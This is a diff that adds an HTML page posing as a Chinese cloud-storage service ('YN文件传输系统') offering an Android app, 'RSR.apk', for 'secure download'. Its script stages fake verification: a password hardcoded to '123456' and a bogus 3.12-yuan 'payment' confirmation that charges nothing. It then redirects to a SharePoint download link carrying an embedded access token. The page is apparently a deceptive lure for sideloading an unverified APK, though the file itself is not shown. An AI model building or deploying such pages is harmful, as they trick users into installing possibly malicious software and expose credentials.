@@ -1,1 +1,319 @@
-404
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YN 云存储</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Noto Sans SC', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+            overflow: hidden;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 450px;
+            width: 100%;
+            backdrop-filter: blur(10px);
+            transition: all 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            transform: translateY(0);
+            opacity: 1;
+        }
+        .container.hidden {
+            transform: translateY(50px);
+            opacity: 0;
+        }
+        h1 {
+            color: #4a4a4a;
+            margin-bottom: 1.5rem;
+            font-weight: 700;
+            font-size: 2.5rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            transition: all 0.5s ease;
+        }
+        .info {
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            color: #555;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.5s ease;
+            transform: translateY(0);
+            opacity: 1;
+        }
+        .info.hidden {
+            transform: translateY(20px);
+            opacity: 0;
+        }
+        .info span {
+            font-weight: 700;
+            color: #4a4a4a;
+        }
+        button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            font-size: 1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
+        }
+        button:active {
+            transform: translateY(-1px);
+            box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+        }
+        button::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        button:focus:not(:active)::after {
+            animation: ripple 1s ease-out;
+        }
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 1;
+            }
+            20% {
+                transform: scale(25, 25);
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+                transform: scale(40, 40);
+            }
+        }
+        input {
+            width: 100%;
+            padding: 0.8rem;
+            margin-bottom: 1rem;
+            border: 2px solid #ddd;
+            border-radius: 50px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        input:focus {
+            border-color: #667eea;
+            outline: none;
+            box-shadow: 0 0 10px rgba(102,126,234,0.5);
+        }
+        .slide-in {
+            animation: slideIn 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .fade-in {
+            animation: fadeIn 0.5s ease forwards;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+        .loading {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #667eea;
+            animation: spin 1s ease-in-out infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .error-message {
+            color: #ff4757;
+            background-color: #ffe6e6;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+        .error-message.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .success-message {
+            color: #28a745;
+            background-color: #e6ffe6;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+        .success-message.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="main-content">
+        <h1 class="slide-in">YN文件传输系统</h1>
+        <div class="info slide-in"><strong>文件名:</strong> <span id="filename">RSR.apk</span></div>
+        <div class="info slide-in"><strong>文件大小:</strong> <span id="filesize">70.26MB</span></div>
+        <div class="info slide-in"><strong>发布方:</strong> <span id="description">LG （yn云盘普通会员）</span></div>
+        <button onclick="showPasswordPrompt()" class="slide-in">安全下载</button>
+    </div>
+
+    <script>
+        let currentStep = 0;
+        const steps = [
+            { title: "安全验证", content: "请输入访问密码", input: true, buttonText: "验证" },
+            { title: "文件传输确认", content: "本次文件大小需付费3.12元，请输入以下代码进行确认", input: true, buttonText: "确认" },
+            { title: "处理中", loading: true },
+        ];
+
+        let encodedCode = '';
+        let originalCode = '';
+
+        function showPasswordPrompt() {
+            currentStep = 0;
+            updateContent();
+        }
+
+        function updateContent() {
+            const container = document.getElementById('main-content');
+            container.classList.add('hidden');
+            
+            setTimeout(() => {
+                const step = steps[currentStep];
+                let content = `<h1 class="slide-in">${step.title}</h1>`;
+                
+                if (step.content) {
+                    content += `<p class="slide-in">${step.content}</p>`;
+                }
+                
+                if (step.input) {
+                    if (currentStep === 1) {
+                        originalCode = generateRandomCode();
+                        encodedCode = btoa(originalCode);
+                        content += `<p class="slide-in">访问码: ${encodedCode}</p>`;
+                        content += `<input type="text" id="input-field" placeholder="请输入支付 id" class="slide-in">`;
+                    } else {
+                        content += `<input type="password" id="input-field" placeholder="请输入..." class="slide-in">`;
+                    }
+                }
+                
+                if (step.loading) {
+                    content += '<div class="loading fade-in"></div>';
+                } else {
+                    content += `<button onclick="nextStep()" class="slide-in">${step.buttonText || '下一步'}</button>`;
+                }
+                
+                content += '<div id="message" class="error-message"></div>';
+                
+                container.innerHTML = content;
+                container.classList.remove('hidden');
+                
+                if (step.loading) {
+                    setTimeout(() => {
+                        window.location.href = 'https://huangaaaa.sharepoint.com/sites/hk1/_layouts/15/download.aspx?UniqueId=f2b4f221-25fa-4789-82fc-4b50957d70d3&Translate=false&tempauth=v1.eyJzaXRlaWQiOiI2MjdhMDc1My1iNjNiLTRkZWItOTc5OC04MGQxZTlkNmI2ZTMiLCJhcHBfZGlzcGxheW5hbWUiOiJiYXNpYyIsImFwcGlkIjoiZDBkZmIxN2MtZGExYy00YzllLTlmMjctYzFjNWE5OWNhMGNiIiwiYXVkIjoiMDAwMDAwMDMtMDAwMC0wZmYxLWNlMDAtMDAwMDAwMDAwMDAwL2h1YW5nYWFhYS5zaGFyZXBvaW50LmNvbUBhYmYzODg3ZC03OWEyLTRiOTItOWIzOS1kMjJiMTdlMzNlOTYiLCJleHAiOiIxNzM4ODA3NTA4In0.CgoKBHNuaWQSAjY0EgsIzsHw04qV4z0QBRoOMjAuMTkwLjE1MS4xMDAqLDhEcllaZ2lPbW9NVnFYZk5LRzZnUDVGVmZkR3ZuK3BQei9hUzF1czI1Q0E9MIIBOAFCEKF-r26NkABAopVhmlXKglhKEGhhc2hlZHByb29mdG9rZW5SCFsia21zaSJdcikwaC5mfG1lbWJlcnNoaXB8MTAwMzIwMDQzZjNmMGM1N0BsaXZlLmNvbXoBMoIBEgl9iPOronmSSxGbOdIrF-M-lqIBHWhrMUBodWFuZ2FhYWEub25taWNyb3NvZnQuY29tqgEQMTAwMzIwMDQzRjNGMEM1N7IBDmFsbGZpbGVzLndyaXRlyAEB.trP6tV9RaGWc4ixyAAG7x6I_YZIeP3gIE_WaDe8Zv0U&ApiVersion=2.0';
+                    }, 3000);
+                }
+            }, 300);
+        }
+
+        function nextStep() {
+            const inputField = document.getElementById('input-field');
+            const messageElement = document.getElementById('message');
+            
+            if (inputField) {
+                const inputValue = inputField.value;
+                if (currentStep === 0) {
+                    if (inputValue !== "123456") {
+                        showError("密码错误，请重试。");
+                        return;
+                    }
+                } else if (currentStep === 1) {
+                    if (inputValue !== originalCode) {
+                        showError("验证失败，请重试。");
+                        return;
+                    }
+                }
+            }
+            
+            messageElement.textContent = '';
+            messageElement.classList.remove('show', 'error-message', 'success-message');
+            
+            currentStep++;
+            if (currentStep < steps.length) {
+                updateContent();
+            }
+        }
+
+        function generateRandomCode() {
+            return Math.floor(100000 + Math.random() * 900000).toString();
+        }
+
+        function showError(message) {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = message;
+            messageElement.classList.remove('success-message');
+            messageElement.classList.add('error-message', 'show');
+            setTimeout(() => {
+                messageElement.classList.remove('show');
+            }, 3000);
+        }
+
+        function showSuccess(message) {
+            const messageElement = document.getElementById('message');
+            messageElement.textContent = message;
+            messageElement.classList.remove('error-message');
+            messageElement.classList.add('success-message', 'show');
+            setTimeout(() => {
+                messageElement.classList.remove('show');
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
